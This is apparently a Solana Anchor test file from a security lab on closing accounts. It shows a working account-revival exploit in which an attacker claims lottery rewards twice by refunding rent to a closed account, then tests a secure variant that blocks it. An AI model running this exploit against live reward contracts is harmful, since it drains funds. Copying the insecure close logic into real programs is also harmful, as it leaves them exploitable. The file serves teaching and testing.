import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { ClosingAccounts } from "../target/types/closing_accounts";
import {
  PublicKey,
  Keypair,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import {
  getOrCreateAssociatedTokenAccount,
  createMint,
  getAccount,
} from "@solana/spl-token";
import { airdropIfRequired } from "@solana-developers/helpers";
import { expect } from "chai";

describe("Closing accounts", () => {
  // Configure the client to use the local cluster.
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>;
  const attacker = Keypair.generate();
  let attackerAta: PublicKey;
  let rewardMint: PublicKey;
  let mintAuth: PublicKey;

  before(async () => {
    await airdropIfRequired(
      provider.connection,
      attacker.publicKey,
      2 * LAMPORTS_PER_SOL,
      1 * LAMPORTS_PER_SOL
    );

    [mintAuth] = PublicKey.findProgramAddressSync(
      [Buffer.from("mint-seed")],
      program.programId
    );

    rewardMint = await createMint(
      provider.connection,
      attacker,
      mintAuth,
      null,
      6
    );

    const associatedAcct = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      attacker,
      rewardMint,
      attacker.publicKey
    );
    attackerAta = associatedAcct.address;
  });

  it("enters lottery successfully", async () => {
    try {
      await program.methods
        .enterLottery()
        .accounts({
          user: attacker.publicKey,
          userAta: attackerAta,
        })
        .signers([attacker])
        .rpc();
    } catch (error) {
      throw new Error(`Failed to enter lottery: ${error.message}`);
    }
  });

  it("allows attacker to close + refund lottery account + claim multiple rewards", async () => {
    try {
      const [attackerLotteryEntry] = PublicKey.findProgramAddressSync(
        [Buffer.from("test-seed"), attacker.publicKey.toBuffer()],
        program.programId
      );

      // Claim multiple times
      for (let i = 0; i < 2; i++) {
        const tx = new anchor.web3.Transaction();

        // Instruction claims rewards, program will try to close account
        tx.add(
          await program.methods
            .redeemWinningsInsecure()
            .accounts({
              userAta: attackerAta,
              rewardMint: rewardMint,
              user: attacker.publicKey,
            })
            .signers([attacker])
            .instruction()
        );

        // User adds instruction to refund dataAccount lamports
        const rentExemptLamports =
          await provider.connection.getMinimumBalanceForRentExemption(82);
        tx.add(
          SystemProgram.transfer({
            fromPubkey: attacker.publicKey,
            toPubkey: attackerLotteryEntry,
            lamports: rentExemptLamports,
          })
        );

        // Send transaction
        await provider.sendAndConfirm(tx, [attacker]);

        // Wait for 5 seconds
        await new Promise((resolve) => setTimeout(resolve, 5000));
      }

      const tokenAcct = await getAccount(provider.connection, attackerAta);
      const lotteryEntry = await program.account.lotteryAccount.fetch(
        attackerLotteryEntry
      );

      expect(Number(tokenAcct.amount)).to.equal(
        lotteryEntry.timestamp.toNumber() * 10 * 2
      );
    } catch (error) {
      throw new Error(`Test failed: ${error.message}`);
    }
  });

  it("prevents attacker from claiming multiple rewards with secure claim", async () => {
    try {
      const [attackerLotteryEntry] = PublicKey.findProgramAddressSync(
        [Buffer.from("test-seed"), attacker.publicKey.toBuffer()],
        program.programId
      );

      // First claim
      const tx = new anchor.web3.Transaction();
      tx.add(
        await program.methods
          .redeemWinningsSecure()
          .accounts({
            user: attacker.publicKey,
            userAta: attackerAta,
            rewardMint: rewardMint,
          })
          .instruction()
      );

      // User adds instruction to refund dataAccount lamports
      const rentExemptLamports =
        await provider.connection.getMinimumBalanceForRentExemption(82);
      tx.add(
        SystemProgram.transfer({
          fromPubkey: attacker.publicKey,
          toPubkey: attackerLotteryEntry,
          lamports: rentExemptLamports,
        })
      );

      // Send first transaction
      await provider.sendAndConfirm(tx, [attacker]);

      // Attempt second claim
      try {
        await program.methods
          .redeemWinningsSecure()
          .accounts({
            user: attacker.publicKey,
            userAta: attackerAta,
            rewardMint: rewardMint,
          })
          .signers([attacker])
          .rpc();

        // If we reach here, the transaction didn't throw as expected
        expect.fail("Expected an error but transaction succeeded");
      } catch (error) {
        console.log(error.message);
        expect(error).to.exist;
      }
    } catch (error) {
      throw new Error(`Test failed: ${error.message}`);
    }
  });
});
